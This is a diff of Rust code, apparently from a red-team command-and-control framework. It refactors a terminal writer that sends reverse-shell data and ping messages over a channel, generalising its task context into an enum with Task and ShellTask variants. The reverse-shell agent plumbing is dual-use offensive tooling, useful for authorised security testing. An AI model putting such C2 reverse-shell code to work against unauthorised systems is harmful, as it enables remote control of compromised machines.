@@ -4,18 +4,25 @@ use crossterm::{
     terminal,
 };
 use eldritch::repl::Repl;
-use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, TaskContext};
+use eldritch_agent::Context;
+use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, reverse_shell_request};
 
 pub struct VtWriter {
     pub tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
-    pub task_context: TaskContext,
+    pub context: Context,
 }
 
 impl std::io::Write for VtWriter {
     fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
         let data = buf.to_vec();
+
+        let context_val = match &self.context {
+            Context::Task(tc) => Some(reverse_shell_request::Context::TaskContext(tc.clone())),
+            Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(stc.clone())),
+        };
+
         match self.tx.blocking_send(ReverseShellRequest {
-            context: Some(self.task_context.clone()),
+            context: context_val,
             kind: ReverseShellMessageKind::Data.into(),
             data,
         }) {
@@ -25,8 +32,13 @@ impl std::io::Write for VtWriter {
     }
 
     fn flush(&mut self) -> std::io::Result<()> {
+        let context_val = match &self.context {
+            Context::Task(tc) => Some(reverse_shell_request::Context::TaskContext(tc.clone())),
+            Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(stc.clone())),
+        };
+
         match self.tx.blocking_send(ReverseShellRequest {
-            context: Some(self.task_context.clone()),
+            context: context_val,
             kind: ReverseShellMessageKind::Ping.into(),
             data: Vec::new(),
         }) {
